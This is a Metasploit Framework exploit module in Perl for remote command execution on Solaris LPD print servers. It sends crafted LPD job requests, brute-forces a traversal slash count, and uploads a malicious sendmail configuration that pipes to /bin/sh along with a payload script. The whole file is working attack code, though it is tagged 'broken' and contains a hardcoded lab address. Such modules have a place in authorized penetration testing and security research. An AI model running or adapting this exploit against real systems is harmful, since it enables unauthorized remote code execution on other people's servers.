
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_lpd_exec;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
    'Name'  => 'Solaris LPD Command Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>'],
    'Arch'  => [ ],
    'OS'    => [ 'solaris' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The LPD server port', 515],
                   },
    'Payload' => {
        'Space'    => 1024,
        'Keys'     => ['cmd'],                
    },
    
    'Description'  => Pex::Text::Freeform(qq{

    }),
    'Refs'  =>  [  
                   
                ],
    'Keys'  => ['broken'],    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_path = $self->GetVar('RPATH');
    my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
    my $res;
    
    
    my $slashes = $self->FindSlashes($target_host, $target_port);
    if (! $slashes) {
        $self->PrintLine("[*] Could not determine the number of slashes required");
        return;
    }
    
    # We use one connection to configure the spool directory
    my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    if ($s->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $s->GetError);
      return;
    }

    # Send the job request command with the faked printer spool
    $s->Send("\x02". ("/" x $slashes). "metasploit" ."\n");
    $res = $s->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our job request command");
        return;
    }
    
    my $spath = "/var/spool/lp/tmp/::ffff:172.16.200.79";
    
    # Send the control file
    my $control = 
    "I"."metasploit\n".
    "P"."\\\"-C".$spath."/mail.cf\\\" nobody\n".
    "f"."cfA187config\n".
    "f"."dfA187script\n";

    # Send the mail configuration file
    my $mailcf =
    "V8\n".
    "\n".
    "Ou0\n".
    "Og0\n".
    "OL0\n".
    "Oeq\n".
    "OQX/tmp\n".
    "\n".
    "FX|/bin/sh $spath/script\n".
    "\n".
    "S3\n".
    "S0\n".
    "R\$+     \$#local \$\@blah \$:blah\n".
    "S1\n".
    "S2\n".
    "S4\n".
    "S5\n".
    "\n".
    "Mlocal  P=/bin/sh, J=S, S=0, R=0, A=sh /bin/ls\n".
    "Mprog   P=/bin/sh, J=S, S=0, R=0, A=sh /bin/ls\n";
    
    if ( ! $self->SendFile($s, 2, "cfA187control", $control) ||
         ! $self->SendFile($s, 2, "mail.cf", $mailcf)        ||
         ! $self->SendFile($s, 3, "script", $shellcode)
       ) { $s->Close; return }
       
    $s->Send("\x05"."metasploit\n");
    $s->Close;

    # We use one connection to configure the spool directory
    my $t = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host, 
        'PeerPort'  => $target_port, 
        'LocalPort' => $self->GetVar('CPORT'),
        'SSL'       => $self->GetVar('SSL'),
    );
    if ($t->IsError) {
      $self->PrintLine('[*] Error creating socket: ' . $t->GetError);
      return;
    }
    
    # Send the job request command again with the faked printer spool
    $t->Send("\x02". ("/" x $slashes). "metasploit" ."\n");
    $res = $t->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our job request command");
        return;
    }
    
    if ( ! $self->SendFile($t, 2, "cfA187owned",  $control) ||
         ! $self->SendFile($t, 2, "cfA187config", $mailcf)  ||
         ! $self->SendFile($t, 3, "dfA187script", $shellcode)
       ) { $t->Close; return }

    $t->Close;
    sleep(200);
    return;
}

sub FindSlashes {
    my $self = shift;
    my $host = shift;
    my $port = shift;
    
    for (my $x=1000; $x < 1200; $x++) {
        my $s = Msf::Socket::Tcp->new
        (
            'PeerAddr'  => $host, 
            'PeerPort'  => $port, 
            'LocalPort' => $self->GetVar('CPORT'),
            'SSL'       => $self->GetVar('SSL'),
        );
        if ($s->IsError) {
          $self->PrintLine("[*] Error creating socket ($x): " . $s->GetError);
          return;
        }
        
        $s->Send("\x02".("/" x $x)."metasploit\n");
        my $r = $s->Recv(1, 5);
        $s->Close;
        
        return $x if ord($r) == 0;
    }
    return;
}

sub SendFile {
    my $self = shift;
    my $sock = shift;
    my $type = shift;
    my $name = shift;
    my $data = shift;    
    
    $sock->Send(chr($type)." ". length($data). " $name\n");
    my $res = $sock->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our control file command ($name)");
        return;
    }
      
    $sock->Send($data);
    $sock->Send("\x00");
    $res = $sock->Recv(1, 5);
    if (ord($res) != 0) {
        $self->PrintLine("[*] The target did not accept our control file data ($name)");
        return;
    }
    
    $self->PrintLine("[*] Uploaded $type:$name => ".length($data). " bytes");
    return 1;        
}
